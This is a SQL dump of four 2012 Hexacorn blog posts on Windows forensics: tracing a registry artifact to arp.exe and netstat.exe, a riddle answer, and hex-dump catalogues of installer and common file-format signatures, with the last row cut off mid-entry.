INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (371, 'Permanent Link to The Curious Case of the Forensic Artifact', 'Hexacorn', 'May 2, 2012 ', 'Back in March Harlan asked on Twitter if anyone has any information about a Registry value called TrapPollTimeMilliSecs. It triggered my interest and I decided to do some research.\nIf you run a quick google search on it, you will find lots of AV reports listing it. At this stage it is tempting to quickly draw a conclusion that it might be used by malware. I was not convinced though and researched it further. Few minutes later I was able to provide some (hopefully) reasonable explanation what creates it.\nIt crossed my mind today that it may be beneficial to explain what I did, so that it will be easier for other investigators to find out what is the source of similar artifacts (if a similar question pops up in the future).\nThe location\nThe TrapPollTimeMilliSecs REG_DWORD value is a located under the registry key:\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\RFC1156Agent\\CurrentVersion\\Parameters\nand is by default set to\nTrapPollTimeMilliSecs = 15000 (0x3a98)\nbut it doesn’t necessarily exist on a typical system.\nThe explanation\nThe TrapPollTimeMilliSecs registry value is set/queried by a DLL called inetmib1.dll, and more precisely, by its exported API called SnmpExtensionInit API. This API is used by only two executables:\n\narp.exe\nnetstat.exe\n\n(it could be also used by other tools of course, but these are the only ones that popped up during the research on OS-specific files only)\nOnce I found out what .exes are responsible for the artifact, I quickly verified it dynamically:\nOne important thing to note is that the value is created only if these executables are ran from elevated cmd.exe (on systems requiring it).\nAccording to Microsoft’s information about SnmpExtensionInit:\nThe Microsoft SNMP service calls the SnmpExtensionInit function to initialize the SNMP extension agent DLL. This function is an element of the SNMP Extension Agent API.\nI would assume both netstat and arp being network utilities use the functions to talk SNMP to devices on the network, but my knowledge on SNMP internals is too limited to conclude anything here. Still, this is most likely enough information to rule out this artifact from the investigation (and especially if there are prefetch files for arp.exe and netstat.exe on the system).\nThe recipe\nPrerequisites:\n\nGenerate strings for all files inside your windows and system32 directory e.g. use simple extension e.g. *.s to store the strings\nBest to keep them as a copy of all files, together with the strings so you can play with the files w/o risking destroying your Windows/system32 directory by accident (shouldn’t normally happen, because of Windows File Protection/ACLs, but well… always work on a copy of the evidence :))\nif you have more Windows versions available, run strings on all versions and keep them in separated directories as well\n\nOnce you have it in place do as follows:\n\nSearch (grep/findstr) all *.s for the string you are looking for e.g. TrapPollTimeMilliSecs\nThis will narrow down the scope to the list of DLLs/EXEs that create the artifact\nLoad the suspected binaries into Disassembler e.g.  IDA Pro a.k.a. the god of all disassemblers\nFind references to string (can be multiple occurrences)\nSkim/analyze the code to confirm the data is used by registry functions (and maybe how)\n…\nProfit (or create meme)\n\nFor a very specific (unique name) value it is a pretty quick procedure, a few minutes or so.\nApart from playing around with OS binaries, you may also download ReactOS – grepping its source code is one of the best way to understand internal workings of Windows and find how certain artifacts are created (notably, they may be not 100% compatible with Windows, but may give you hints where and what to search for).\nShare this :)', 'Forensic Analysis, Tips & Tricks', 'http://www.hexacorn.com/blog/2012/05/02/the-curious-case-of-the-forensic-artifact/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (372, 'Permanent Link to Forensic Riddle #11 – Answer', 'Hexacorn', 'May 2, 2012 ', 'The answer to the #11 is simple – it was an open-ended question really as it could be any executable file really that is dependent on configuration, config file, etc. I wanted to draw your attention to one type of executables specifically though – a type that I touched on in my recent post i.e. Installers. Their stub is always the same and based on their source code – the behavior depends on the installed application and user choices’. I told you it was easy \n \nShare this :)', 'Forensic Riddles - Answers', 'http://www.hexacorn.com/blog/2012/05/02/forensic-riddle-11-answer/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (373, 'Permanent Link to File Formats ZOO – Installers', 'Hexacorn', 'April 30, 2012 ', 'Continuing on my previous post I am adding some more information about file signatures.\nFirst, the illustration \n\nOne of the types of Portable Executable file format that is not so often discussed are installers. For these who don’t know, in most cases a typical installer for Windows is a standalone Portable Executable file with some extra data appended to it (with a notable exception of .msi files that are containers handles by the Windows Installer).\nThe installer file usually contains two parts. The first part is a standalone setup file that is unique and identical across all installers created with the same version of the (installation) packager/wizard/script. The second part is the actual software that is about to be installed – often preserved in a compressed/encrypted way. The most popular installers include Nullsoft Scriptable Install System (NSIS) and Inno Setup, but there are literally hundreds of them available.\nLet me say here that ‘installer’ is a very wide term and can include pretty much any .exe file with any file appended to its end and in some cases – files embedded inside the main .exe (either directly as a data/encrypted data, or as a resource embedded within a resource section). Many well-known formats are used as an appended data. So, one can find .exes with appended JPG files, Flash Movies, other .exe files and many other variants. One very popular type of installers (even if they don’t necessarily classify as a software installer) are self extracting archives e.g. RarSFX, CABSFX, 7ZSFX, etc. All of these are treated here equally ==> .exe + something appended to it.\nFrom a forensic perspective, determining that some .exe is an installer could help in data reduction as long as we can confirm the installer has been executed on the investigated system. All you have to do is to extract the installer and run it in a test environment. The collected artifacts can be then removed from the local copy of the evidence e.g. by a file name. If you remember my preaching post a few days ago on speeding up case processing – deleting files created by a confirmed installer could be a good thing to do /as long as the installer itself is out of scope/. Let’s not overlook this possibility as removing thousands of small files created by software packages often present on the investigated systems could be a very good data reduction technique. Whether it is Java Runtime Environment, Microsoft Visual Studio, Adobe software, or any other large package, we could save a lot of time simply removing these from our view. While I am saying this, I must emphasize that this is a very unexplored area and needs both more research and new tools. Still, any data reduction technique available to an examiner is more than needed and whoever gets it right and gets there first will be cracking cases in no time.\nMZ...PE... I.n.s.t.a.l.l.S.h.i.e.l.d.\nInstallShield Installer. Contains no appended data.\n4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..............\nB8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......\n…\n74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20  t be run in DOS\n62 29 00 00 00 00 00 00 00 00 50 45 00 00 4C 01  b)........PE..L.\n…\n00 23 00 01 00 43 00 6F 00 6D 00 70 00 61 00 6E  .#...C.o.m.p.a.n\n00 79 00 4E 00 61 00 6D 00 65 00 00 00 00 00 49  .y.N.a.m.e.....I\n00 6E 00 73 00 74 00 61 00 6C 00 6C 00 53 00 68  .n.s.t.a.l.l.S.h\n00 69 00 65 00 6C 00 64 00 20 00 53 00 6F 00 66  .i.e.l.d. .S.o.f\n…\nMZ...PE... _winzip_ …\nA self extracting WinZip32 executable. Contains stub (archive extractor) and a typical Zip file. There is no appended data.\n4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..............\nB8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......\n…\n50 45 00 00 4C 01 05 00 F0 A4 F5 47 00 00 00 00  PE..L......G....\n00 00 00 00 E0 00 03 01 0B 01 08 00 00 E0 00 00  ................\n...\n[section table]\n2E 74 65 78 74 00 00 00 B4 D5 00 00 00 10 00 00  .text...........\n00 E0 00 00 00 10 00 00 00 00 00 00 00 00 00 00  ................\n00 00 00 00 20 00 00 60 2E 72 64 61 74 61 00 00  .... ..`.rdata..\n42 29 00 00 00 F0 00 00 00 30 00 00 00 F0 00 00  B).......0......\n00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 40  ............@..@\n2E 64 61 74 61 00 00 00 DC 54 00 00 00 20 01 00  .data....T... ..\n00 20 00 00 00 20 01 00 00 00 00 00 00 00 00 00  . ... ..........\n00 00 00 00 40 00 00 C0 2E 72 73 72 63 00 00 00  ....@....rsrc...\n88 91 00 00 00 80 01 00 00 A0 00 00 00 40 01 00  .............@..\n00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 40  ............@..@\n5F 77 69 6E 7A 69 70 5F 00 30 0A 00 00 20 02 00  _winzip_.0... ..\n00 30 0A 00 00 E0 01 00 00 00 00 00 00 00 00 00  .0..............\n00 00 00 00 40 00 00 42                          ....@..B\n…\nMZ...PE... | … dbload\nA perl script converted into an executable with a perl2exe utility.\n4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..............\nB8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......\n…\n50 45 00 00 4C 01 04 00 1C B2 B8 3B 00 00 00 00  PE..L......;....\n00 00 00 00 E0 00 0F 01 0B 01 06 00 00 10 00 00  ................\n…\n[Appended data]\n…\n64 62 6C 6F 61 64 20 31 2E 30 20 73 69 67 6E 61  dbload 1.0 signa\n74 75 72 65 0D 0A 0D 0A 80 80 80 80 80 80 80 80  ture............\n…\nMZ...PE... | !sfx!.\nSelf extracting WinAce installer/archive.\n4D 5A 50 00 02 00 00 00 04 00 0F 00 FF FF 00 00  MZP.............\nB8 00 00 00 00 00 00 00 40 00 1A 00 00 00 00 00  ........@.......\n…\n50 45 00 00 4C 01 08 00 19 5E 42 2A 00 00 00 00  PE..L....^B*....\n00 00 00 00 E0 00 8E 81 0B 01 02 19 00 DE 01 00  ................\n…\n[Appended data]\n21 73 66 78 21 00 53 03 00 00 00 01 B8 AF 00 00  !sfx!.S.........\n01 00 00 00 11 00 00 00 06 00 00 00 14 00 00 00  ................\n…\nMZ...PE... | 7z\nSelf extracting 7z installer/archive. Contains stub (archive extractor) and a typical 7z archive.\n4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..............\nB8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......\n…\n50 45 00 00 4C 01 04 00 49 B5 57 47 00 00 00 00  PE..L...I.WG....\n00 00 00 00 E0 00 0F 01 0B 01 06 00 00 92 01 00  ................\n…\n[Appended data]\n37 7A BC AF 27 1C 00 02 E1 AB 8F 68 7E DB C6 00  7z..\'......h~...\n00 00 00 00 26 00 00 00 00 00 00 00 37 1C 2D 11  ....&.......7.-.\n…\nMZ...PE... | BZh\nSelf extracting Bzip2 installer/archive. Contains stub (archive extractor) and a typical Bzip2 archive.\n4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..............\nB8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......\n…\n50 45 00 00 4C 01 04 00 B4 CE 3D 3C 00 00 00 00  PE..L.....=<....\n00 00 00 00 E0 00 0F 01 0B 01 06 00 00 A0 01 00  ................\n…\n[Appended data]\n42 5A 68 39 31 41 59 26 53 59 75 91 99 30 00 02  BZh91AY&SYu..0..\nD9 7F FF FF DF FB FF E3 F5 FF FF FF FF FF FF FF  ...............\n…\nMZ...PE... | CWS\nMacromedia Flash Player. Contains stub (flash player) and a typical compressed Flash file (CWS).\n4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..............\nB8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......\n...\n50 45 00 00 4C 01 06 00 38 AD 57 3F 00 00 00 00  PE..L...8.W?....\n00 00 00 00 E0 00 0F 01 0B 01 06 00 00 00 0C 00  ................\n...\n[Appended data]\n43 57 53 07 5E 9A 01 00 78 9C BC 3B 5B 90 1C D5  CWS.^...x..;[...\n75 67 7A 7A 66 7A DF 0F AD 34 7A EC 4A 42 12 82  ugzzfz...4z.JB..\n…\nMZ...PE... | FWS\nMacromedia Flash Player. Contains stub (flash player) and a typical Flash file (FWS).\n4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..............\nB8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......\n…\n50 45 00 00 4C 01 05 00 FD 8A 49 37 00 00 00 00  PE..L.....I7....\n00 00 00 00 E0 00 0F 01 0B 01 06 00 00 30 03 00  .............0..\n…\n[Appended data]\n46 57 53 04 ED A0 03 00 70 00 09 C4 00 00 FA 00  FWS.....p.......\n00 0C 54 00 43 02 FF FF FF 00 06 44 0B 06 00 00  ..T.C......D....\n…\nMZ...PE... | … IFCM\nMicrosoft Help 2.x.\n4D 5A 00 00 00 00 00 00 00 00 00 00 00 00 00 00  MZ..............\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n…\n50 45 00 00 4C 01 02 00 00 00 00 00 00 00 00 00  PE..L...........\n00 00 00 00 E0 00 01 20 0B 01 00 00 00 00 00 00  ....... ........\n…\n[Appended data]\n…\n49 46 43 4D 01 00 00 00 00 20 00 00 00 00 10 00  IFCM..... ......\nFF FF FF FF FF FF FF FF 09 00 00 00 00 00 00 00  ................…\n…\nMZ...PE... | Inno Setup\nInno Setup installer.\n4D 5A 50 00 02 00 00 00 04 00 0F 00 FF FF 00 00  MZP.............\nB8 00 00 00 00 00 00 00 40 00 1A 00 00 00 00 00  ........@.......\n…\n50 45 00 00 4C 01 08 00 19 5E 42 2A 00 00 00 00  PE..L....^B*....\n00 00 00 00 E0 00 8F 81 0B 01 02 19 00 90 00 00  ................\n…\n[Appended data]\n49 6E 6E 6F 20 53 65 74 75 70 20 53 65 74 75 70  Inno Setup Setup\n20 44 61 74 61 20 28 35 2E 31 2E 31 33 29 00 00   Data (5.1.13)..\n…\nMZ...PE... | MZ\nAn executable with the appended data that probably contains another executable. It may be either a custom installer or a wrapper.\n4D 5A 50 00 02 00 00 00 04 00 0F 00 FF FF 00 00  MZP.............\nB8 00 00 00 00 00 00 00 40 00 1A 00 00 00 00 00  ........@.......\n…\n50 45 00 00 4C 01 08 00 19 5E 42 2A 00 00 00 00  PE..L....^B*....\n00 00 00 00 E0 00 8E 81 0B 01 02 19 00 0E 04 00  ................\n…\n[Appended data]\n4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..............\nB8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......\n…\nMZ...PE... | Rar!\nA self extracting WinRar executable. Contains stub (archive extractor) and a typical Rar file.\n4D 5A 50 00 02 00 00 00 04 00 0F 00 FF FF 00 00  MZP.............\nB8 00 00 00 00 00 00 00 40 00 1A 00 00 00 00 00  ........@.......\n…\n50 45 00 00 4C 01 04 00 E6 68 F2 46 00 00 00 00  PE..L....h.F....\n00 00 00 00 E0 00 0F 01 0B 01 05 00 00 40 01 00  .............@..\n…\n[Appended data]\n52 61 72 21 1A 07 00 CF 90 73 00 00 0D 00 00 00  Rar!.....s......\n00 00 00 00 83 59 7A 00 80 23 00 6E 00 00 00 6E  .....Yz..#.n...n\n…\nMZ... PE... | SQ5SFX\nSqueez self-extracting executable.\n4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..............\nB8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......\n…\n50 45 00 00 4C 01 03 00 BA 1F 9F 48 00 00 00 00  PE..L......H....\n00 00 00 00 E0 00 0F 01 0B 01 06 00 00 C0 00 00  ................\n…\n[Appended data]\n53 51 35 53 46 58 CE B0 01 00 05 00 00 00 C7 0C  SQ5SFX..........\n00 00 5B 64 65 73 63 72 69 70 74 69 6F 6E 5D 0D  ..[description].\n…\nMZ... PE... | sRBV... ResJ\nAWinstall Installer.\n4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..............\nB8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......\n…\n50 45 00 00 4C 01 04 00 94 AD EF 47 00 00 00 00  PE..L......G....\n00 00 00 00 E0 00 03 01 0B 01 09 00 00 C6 01 00  ................\n…\n[Appended data]\n73 52 42 56 06 68 1F 00 16 68 1F 00 06 03 00 00  sRBV.h...h......\n52 65 73 4A 7F FF FB 81 C1 79 91 46 DE D1 BB 72  ResJ.....y.F...r\n…\nMZ...PE... | Smart Install Maker\nInstaller created with Smart InstallMaker.\n4D 5A 50 00 02 00 00 00 04 00 0F 00 FF FF 00 00  MZP.............\nB8 00 00 00 00 00 00 00 40 00 1A 00 00 00 00 00  ........@.......\n…\n50 45 00 00 4C 01 08 00 19 5E 42 2A 00 00 00 00  PE..L....^B*....\n00 00 00 00 E0 00 8E 81 0B 01 02 19 00 62 01 00  .............b..\n…\n[Appended data]\n53 6D 61 72 74 20 49 6E 73 74 61 6C 6C 20 4D 61  Smart Install Ma\n6B 65 72 20 76 2E 20 35 2E 30 30 00 30 00 30 00  ker v. 5.00.0.0.\n…\nMZ...PE... | SZDD\nExecutable with appended file being SZDD archive.\n4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..............\nB8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......\n...\n50 45 00 00 4C 01 05 00 CE F8 9B 3E 00 00 00 00  PE..L......>....\n00 00 00 00 E0 00 0E 01 0B 01 04 14 00 0C 01 00  ................\n...\n[Appended data]\n53 5A 44 44 88 F0 27 33 41 6D F0 A3 01 00 FF 49  SZDD..\'3Am.....I\n54 53 46 03 00 00 00 F5 60 F5 F0 01 F5 F0 33 15  TSF.....`.....3.\n…\nMZ...PE... | wwgT\nInstaller created with Install Creator.\n4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..............\nB8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......\n…\n50 45 00 00 4C 01 03 00 C0 9F C2 41 00 00 00 00  PE..L......A....\n00 00 00 00 E0 00 0F 01 0B 01 06 00 00 30 01 00  .............0..\n…\n[Appended data]\n77 77 67 54 29 48 35 14 01 00 6E 02 00 00 F2 06  wwgT)H5...n.....\n00 00 01 78 DA AD 94 4F 68 13 41 14 C6 DF EE 6C  ...x...Oh.A....l\n…\nMZ...PE... | 0xA3 HK\nAutoIt or AutoHotkey script.\n4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..............\nB8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......\n…\n50 45 00 00 4C 01 03 00 A2 3E 49 47 00 00 00 00  PE..L....>IG....\n00 00 00 00 E0 00 23 01 0B 01 08 00 00 70 03 00  ......#......p..\n…\n[Appended data]\nA3 48 4B BE 98 6C 4A A9 99 4C 53 0A 86 D6 48 7D  .HK..lJ..LS...H}\n41 55 33 21 45 41 30 36 F0 6B 89 18 C1 BC 11 F7  AU3!EA06.k......\n…\nMZ...PE... | 0xEF 0xBE 0xAD 0xDE nsisinstall\nOld version of Nullsoft Installer. Note characteristic hex string “DEADBEEF” (0xEFBEADDE) at the beginning of the appended data.\n4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..............\nB8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......\n…\n50 45 00 00 4C 01 04 00 85 A8 25 3A 00 00 00 00  PE..L.....%:....\n00 00 00 00 E0 00 0F 01 0B 01 06 00 00 60 00 00  .............`..\n…\n[Appended data]\nEF BE AD DE 6E 73 69 73 69 6E 73 74 61 6C 6C 00  ....nsisinstall.\n0D F0 AD 0B 2C 13 00 00 D1 46 09 00 44 46 58 20  ....,....F..DFX\n…\nMZ... PE... |  …0xEF 0xBE 0xAD 0xDE... NullsoftInst\nNullsoft Installer. Note characteristic hex string “DEADBEEF” (0xEFBEADDE) at the beginning of the appended data. In some cases, versions of Nullsoft Installer can be found inside the manifest (in the resources of PE executable).\n4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..............\nB8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......\n…\n50 45 00 00 4C 01 05 00 1A 5A A0 49 00 00 00 00  PE..L....Z.I....\n00 00 00 00 E0 00 0F 01 0B 01 06 00 00 5C 00 00  .............\\..\n…\n00 00 00 00 EF BE AD DE 4E 75 6C 6C 73 6F 66 74  ........Nullsoft\n49 6E 73 74 1D 27 02 00 33 90 17 00 5D 00 00 80  Inst.\'..3...]...\n…\nMZ...PE... | … PK\nA self extracting Zip executable. Contains stub (archive extractor) and a Zip file.\n4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..............\nB8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......\n…\n50 45 00 00 4C 01 03 00 5A F5 36 48 00 00 00 00  PE..L...Z.6H....\n00 00 00 00 E0 00 03 01 0B 01 08 00 00 00 01 00  ................\n…\n[End of file]\n50 4B 05 06 00 00 00 00 04 00 04 00 EF 00 00 00  PK..............\nFF 99 48 01 00 00 00 00 00 00 00 00 50 15 00 00  ..H.........P...\n…\nMZ... PE...  | … Wise\nWISE Installer.\n4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..............\nB8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......\n…\n50 45 00 00 4C 01 04 00 3F 6C D8 3B 00 00 00 00  PE..L...?l.;....\n00 00 00 00 E0 00 0F 05 0B 01 06 00 00 22 00 00  .............\"..\n…\n[Appended data]\n…\n57 69 73 65 20 49 6E 73 74 61 6C 6C 61 74 69 6F  Wise Installatio\n6E 20 57 69 7A 61 72 64 2E 2E 2E 00 ED 5B CD 8F  n Wizard.....[..\n…\nMZ...PE... | … ESIV\nVISE Installer.\n4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..............\nB8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......\n...\n50 45 00 00 4C 01 05 00 49 E3 5E 37 00 00 00 00  PE..L...I.^7....\n00 00 00 00 E0 00 0F 01 0B 01 06 00 00 C0 00 00  ................\n...\n[End of file]\nDA E1 E1 47 47 DA DA E1 E1 47 47 DA DA E1 E1 47  ...GG....GG....G\n8F D9 A8 DE F4 9C 03 FF 45 53 49 56 00 10 01 00  ........ESIV....\n…\nShare this :)', 'File Formats ZOO', 'http://www.hexacorn.com/blog/2012/04/30/file-formats-zoo-installers/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (374, 'Permanent Link to File Formats ZOO', 'Hexacorn', 'April 30, 2012 ', 'In 2009 my wife drawn a lovely illustration for my upcoming book about malware analysis. Unfortunately, I couldn’t complete the book (for various reasons) and her work never saw it to the printer. I really liked that illustration though and have been always thinking that I will find a way to use it one day. Today is the day and I present it to you, together with a short information on some most popular file formats. File formats is a topic that has been discussed so many times that it is not even worth mentioning, yet I do hope that while skimming the short information below, you will still find something new there. I have more interesting file signatures to come and will publish them when I complete binary snapshots. Illustration will be there too \n\n0x00 0x00 0x01 0x00\nWindows Icon file (*.ico).\n00 00 01 00 01 00 20 20 10 00 00 00 00 00 E8 02  ……  ……..\n00 00 16 00 00 00 28 00 00 00 20 00 00 00 40 00  ……(… …@.\n…\n0x00 0x00 0x01\nMpg movie (*.mpg, *.mpe, *.mpeg).\n00 00 01 BA 21 00 01 00 0F 80 0D F9 00 00 01 BB  ….!………..\n00 0C 80 0D F9 07 E1 FF B8 C0 20 B9 E0 28 00 00  ………. ..(..\n…\n0x00 0x01 0x00 0x00 Standard Jet DB\nMicrosoft Access database  (*.mdb, *.accdb).\n00 01 00 00 53 74 61 6E 64 61 72 64 20 4A 65 74  ….Standard Jet\n20 44 42 00 00 00 00 00 B5 6E 03 62 60 09 C2 55   DB……n.b`..U\n…\n. . 0x0D 0x0A\nPython compiler script  (*.pyc).\nD1 F2 0D 0A 7E 74 F3 47 63 00 00 00 00 00 00 00  ....~t.Gc…….\n00 0B 00 00 00 40 00 00 00 73 FD 00 00 00 64 00  …..@…s….d.\n…\n0x1F 0x8B\nTar archive compressed using gzip (*.tgz).\n1F 8B 08 00 03 83 74 3A 02 03 EC 3C FD 73 DB 36  ……t:…<.s.6\nB2 FD D5 FC 2B 30 8E A6 B6 72 16 15 F9 2B 17 B9  ….+0…r…+..\n…\n!<arch>\nLibrary file (*.lib).\n21 3C 61 72 63 68 3E 0A 2F 20 20 20 20 20 20 20  !<arch>./\n20 20 20 20 20 20 20 20 31 31 32 36 39 34 35 34          11269454\n…\n!<arch>.debian-binary\nDebian software package (*.deb).\n21 3C 61 72 63 68 3E 0A 64 65 62 69 61 6E 2D 62  !<arch>.debian-b\n69 6E 61 72 79 20 20 20 31 32 30 36 36 34 30 32  inary   11066402\n…\n%PDF\nPDF document File (*.pdf).\n25 50 44 46 2D 31 2E 33 0D 25 E2 E3 CF D3 0D 0A  %PDF-1.3.%……\n36 20 30 20 6F 62 6A 0D 3C 3C 20 0D 2F 4C 69 6E  6 0 obj.<< ./Lin\n…\n.RMF\nRMVB movie (*.rm, *.rmvb).\n2E 52 4D 46 00 00 00 12 00 01 00 00 00 00 00 00  .RMF…………\n00 07 50 52 4F 50 00 00 00 32 00 00 00 1C FD E0  ..PROP…2……\n…\n0& 0xB2 u\nASF or WMV movie (*.asf, *.wmv).\n30 26 B2 75 8E 66 CF 11 A6 D9 00 AA 00 62 CE 6C  0&.u.f…….b.l\n85 02 00 00 00 00 00 00 05 00 00 00 01 02 A1 DC  …………….\n…\n7z\n7Zip archive (*.7z).\n37 7A BC AF 27 1C 00 03 11 05 8F B2 13 00 00 00  7z..’………..\n00 00 00 00 54 00 00 00 00 00 00 00 8F 51 A0 B5  ….T……..Q..\n…\n?_\nOld Windows Help format (*.hlp).\n3F 5F 03 00 0C 01 00 00 FF FF FF FF 1B 39 00 00  ?_………..9..\nFC 00 00 00 F3 00 00 00 00 6C 03 21 00 01 00 21  ………l.!…!\n…\nBM\nBitmap file (*.bmp).\n42 4D 38 00 1B 00 00 00 00 00 36 00 00 00 28 00  BM8…….6…(.\n00 00 00 03 00 00 40 02 00 00 01 00 20 00 00 00  ……@….. …\n…\nBZh\nArchive compressed using Bzip2 (*.bz, *.bz2, *.bzip2).\n42 5A 68 39 31 41 59 26 53 59 B6 0D 89 62 00 8F  BZh91AY&SY…b..\nC8 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF  ……………….\n…\nCWS\nCompressed Flash movie (*.swf).\n43 57 53 08 AD C6 00 00 78 9C E4 BD 07 5C 13 CB  CWS…..x….\\..\nF7 28 3E 1B 12 B2 81 D0 41 50 83 62 07 41 11 EC  .(>…..AP.b.A..\n…\nd8:announce\nTorrent file (*.torrent).\n64 38 3A 61 6E 6E 6F 75 6E 63 65 33 39 3A 68 74  d8:announce39:ht\n74 70 3A 2F 2F 74 6F 72 72 65 6E 74 2E 75 62 75  tp://torrent.ubu\n…\nFLV\nFlash Video file (*.flv).\n46 4C 56 01 05 00 00 00 09 00 00 00 00 12 00 01  FLV.…………\nC2 00 00 00 00 00 00 00 02 00 0A 6F 6E 4D 65 74  ………..onMet\n…\n…ftyp\nQuicktime movie (*.mov).\n00 00 00 20 66 74 79 70 71 74 20 20 20 05 03 00  … ftypqt   …\n71 74 20 20 00 00 00 00 00 00 00 00 00 00 00 00  qt  …………\n…\nFrom: <Saved by Windows Internet Explorer>\nMIME HTML archive which may contain various files saved in a MIME format (*.mht).\n46 72 6F 6D 3A 20 3C 53 61 76 65 64 20 62 79 20  From: <Saved by \n57 69 6E 64 6F 77 73 20 49 6E 74 65 72 6E 65 74  Windows Internet\n20 45 78 70 6C 6F 72 65 72 20 37 3E 0D 0A 53 75   Explorer 7>..Su\n…\nGIF87a\nPicture saved in GIF 87a format (*.gif).\n47 49 46 38 37 61 59 00 6D 00 F7 00 00 00 00 00  GIF87aY.m…….\n00 00 40 00 00 80 00 00 FF 00 20 00 00 20 40 00  ..@……. .. @.\n…\nGIF89a\nPicture saved in GIF 89a format (*.gif).\n47 49 46 38 39 61 01 00 01 00 80 00 00 FF FF FF  GIF89a……….\n00 00 00 21 F9 04 01 00 00 00 00 2C 00 00 00 00  …!…….,….\n…\nID3\nMp3 music file (*.mp3).\n49 44 33 03 00 00 00 00 06 46 54 45 4E 43 00 00  ID3……FTENC..\n00 01 40 00 00 00 00 00 00 00 00 00 02 00 00 00  ..@………….\n…\nIDA1\nThe database of IDA Pro disassembler (*.ida).\n49 44 41 31 00 00 3E 00 00 00 43 60 01 00 48 E0  IDA1..>…C`..H.\n01 00 00 00 00 00 4D 20 02 00 DD CC BB AA 01 00  ……M ……..\n…\nII\nImage saved in TIFF (Intel) file format (*.tif, *.tiff).\n49 49 2A 00 18 CA 34 00 2C 30 33 35 37 3B 34 35  II*…4.,0357;45\n39 38 38 3D 38 37 3C 35 34 39 33 31 36 31 2F 34  988=87<5493161/4\n…\nISC(\nInstallShield Cabinet File (*.cab). Requires a separate installer called setup.exe.\n49 53 63 28 0C 60 00 01 00 00 00 00 00 02 00 00  ISc(.`……….\n00 00 00 00 00 02 00 00 00 00 00 00 00 00 00 00  …………….\n…\nITSF\nWindows Help File (*.chm).\n49 54 53 46 03 00 00 00 60 00 00 00 01 00 00 00  ITSF….`…….\n40 62 C0 46 09 04 00 00 10 FD 01 7C AA 7B D0 11  @b.F…….|.{..\n…\nKGB_arch\nArchive file created by KGB compression utility (*.kgb).\n4B 47 42 5F 61 72 63 68 20 2D 33 0D 0A 32 35 30  KGB_arch -3..250\n30 33 32 09 72 65 61 64 6D 65 2E 74 78 74 0D 0A  032.readme.txt..\n…\nL 0x00 0x00 0x00\nWindows shortcut file (*.lnk).\n4C 00 00 00 01 14 02 00 00 00 00 00 C0 00 00 00  L……………\n00 00 00 46 CB 40 00 00 20 00 00 00 F4 AA 17 AE  …F.@.. …….\n…\nL 0x01 0x05\nObject file (*.obj).\n4C 01 05 00 67 20 93 45 76 0A 00 00 3C 00 00 00  L...g .Ev…<…\n00 00 00 00 2E 74 65 78 74 00 00 00 00 00 00 00  …..text…….\n…\nMM\nImage saved in TIFF (Motorola) file format (*.tif, *.tiff).\n4D 4D 00 2A 00 00 0D 32 81 FF CD FF FB FF FF FE  MM.*…2……..\n01 FF FD FA FE 06 FF FE FE FF FE FE FF FF FE FD  …………….\n…\n…moov\nQuicktime movie (*.mov).\n00 00 41 DE 6D 6F 6F 76 00 00 00 6C 6D 76 68 64  ..A.moov…lmvhd\n00 00 00 00 BD 38 15 59 BD 38 15 59 00 00 02 58  …..8.Y.8.Y…X\n…\nMP+\nMusepack Audio File (*.mpc).\n4D 50 2B 07 81 35 00 00 00 00 C0 5F 00 00 00 00  MP+..5….._….\n00 00 00 00 00 00 C0 80 F7 07 02 73 5A 3B 8B 80  